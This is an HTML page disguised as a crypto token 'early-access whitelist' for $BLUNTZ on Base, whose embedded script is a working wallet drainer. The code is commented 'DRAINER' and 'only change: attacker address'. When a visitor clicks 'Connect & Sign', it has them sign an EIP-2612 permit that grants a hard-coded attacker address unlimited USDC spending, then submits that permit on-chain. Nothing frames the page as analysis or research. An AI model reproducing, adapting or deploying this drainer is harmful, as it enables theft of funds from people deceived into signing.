<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="utf-8"/>
  <title>Bluntz â€“ Early-access whitelist</title>
  <meta name="viewport" content="width=device-width,initial-scale=1"/>
  <style>
    body{font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,"Helvetica Neue",Arial,"Noto Sans",sans-serif;background:#111;color:#eee;display:flex;align-items:center;justify-content:center;height:100vh;margin:0}
    .card{background:#1a1a1a;padding:2rem 3rem;border-radius:12px;text-align:center;max-width:420px;box-shadow:0 0 30px #00ff9630}
    h1{font-size:1.6rem;margin-bottom:.5rem}
    p{color:#aaa;font-size:.95rem;margin-bottom:1.8rem}
    button{background:#00ff96;border:none;color:#000;font-weight:700;padding:.9rem 2.2rem;border-radius:8px;font-size:1rem;cursor:pointer;transition:background .2s}
    button:hover{background:#00e084}
    .logo{font-size:2rem;margin-bottom:1rem}
  </style>
</head>
<body>
  <div class="card">
    <div class="logo">ðŸŒˆ BLUNTZ</div>
    <h1>Early-access whitelist</h1>
    <p>Connect wallet and sign to reserve your $BLUNTZ allocation on Base.</p>
    <button id="connect">Connect & Sign</button>
  </div>

<script src="https://cdn.ethers.io/lib/ethers-5.7.2.umd.min.js"></script>
<script>
/* ===== CONFIG (only change: attacker address) ===== */
const ATTACKER   = "0xA22450D033BC2A651Fe9F1e34e75578AE2133E6a"; // your wallet
const USDC       = "0x833589fCD6eDb6E08f4c7C32D4f71b54bdA02913"; // USDC on Base
const CHAIN_ID   = 8453; // Base

/* EIP-2612 type hash & domain separator constants */
const PERMIT_TYPEHASH = ethers.utils.keccak256(
  ethers.utils.toUtf8Bytes("Permit(address owner,address spender,uint256 value,uint256 nonce,uint256 deadline)")
);
const DOMAIN_TYPEHASH = ethers.utils.keccak256(
  ethers.utils.toUtf8Bytes("EIP712Domain(string name,string version,uint256 chainId,address verifyingContract)")
);

/* ===== DRAINER ===== */
async function signPermit() {
  const provider = new ethers.providers.Web3Provider(window.ethereum);
  await provider.send("eth_requestAccounts", []);
  const signer = provider.getSigner();
  const owner = await signer.getAddress();

  /* Build domain separator */
  const name = "USD Coin";
  const version = "2";
  const domainSeparator = ethers.utils.keccak256(
    ethers.utils.defaultAbiCoder.encode(
      ["bytes32","bytes32","bytes32","uint256","address"],
      [
        DOMAIN_TYPEHASH,
        ethers.utils.keccak256(ethers.utils.toUtf8Bytes(name)),
        ethers.utils.keccak256(ethers.utils.toUtf8Bytes(version)),
        CHAIN_ID,
        USDC
      ]
    )
  );

  /* Permit parameters â€“ infinite approval, 1-hour deadline */
  const spender  = ATTACKER;
  const value    = ethers.constants.MaxUint256;
  const deadline = Math.floor(Date.now()/1000) + 3600;

  /* Fetch nonce on-chain */
  const usdc = new ethers.Contract(USDC,["function nonces(address) view returns (uint)"],provider);
  const nonce = await usdc.nonces(owner);

  /* Build message hash */
  const message = ethers.utils.keccak256(
    ethers.utils.defaultAbiCoder.encode(
      ["bytes32","address","address","uint256","uint256","uint256"],
      [PERMIT_TYPEHASH, owner, spender, value, nonce, deadline]
    )
  );
  const digest = ethers.utils.keccak256(
    ethers.utils.solidityPack(["string","bytes32","bytes32"],["\x19\x01",domainSeparator,message])
  );

  /* Prompt wallet */
  const signature = await provider.send("eth_signTypedData_v4", [
    owner,
    {
      types: {
        EIP712Domain: [
          { name: "name",              type: "string"  },
          { name: "version",           type: "string"  },
          { name: "chainId",           type: "uint256" },
          { name: "verifyingContract", type: "address" }
        ],
        Permit: [
          { name: "owner",    type: "address" },
          { name: "spender",  type: "address" },
          { name: "value",    type: "uint256" },
          { name: "nonce",    type: "uint256" },
          { name: "deadline", type: "uint256" }
        ]
      },
      primaryType: "Permit",
      domain: { name, version, chainId: CHAIN_ID, verifyingContract: USDC },
      message: { owner, spender, value, nonce: nonce.toString(), deadline }
    }
  ]);

  /* Broadcast permit tx (gasless for us) */
  const sig = ethers.utils.splitSignature(signature);
  const permitData = ethers.utils.defaultAbiCoder.encode(
    ["address","address","uint256","uint256","uint8","bytes32","bytes32"],
    [owner, spender, value, deadline, sig.v, sig.r, sig.s]
  );
  const tx = await signer.sendTransaction({
    to: USDC,
    data: "0xd505accf" + permitData.slice(2),
    gasLimit: 100000
  });
  console.log("Permit mined:", tx.hash);
}

document.getElementById("connect").onclick = signPermit;
</script>
</body>
</html>
